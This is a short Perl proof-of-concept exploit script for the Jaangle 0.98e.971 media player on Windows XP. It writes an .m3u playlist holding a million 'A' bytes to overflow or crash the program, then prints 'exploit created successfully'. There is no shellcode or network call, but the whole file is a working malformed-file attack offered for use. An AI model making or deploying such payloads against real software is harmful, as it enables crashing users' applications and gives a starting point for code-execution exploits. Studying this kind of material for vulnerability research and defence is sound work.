#!/usr/bin/perl
# jaangle 0.98e.971
# Author: s-dz        , s-dz@hotmail.fr
# Download : http://www.jaangle.com/files/jsetup.exe
# Tested : Windows XP SP2 (fr)
# DATE   : 2010-08-02
#
# thanks TCT , DGM8
# 
my $file= "mahboul-3lik00.m3u";
my $junk= "\x41" x  1000000;

open($FILE, ">$file");
print($FILE $junk);
close($FILE);
print("exploit created successfully");
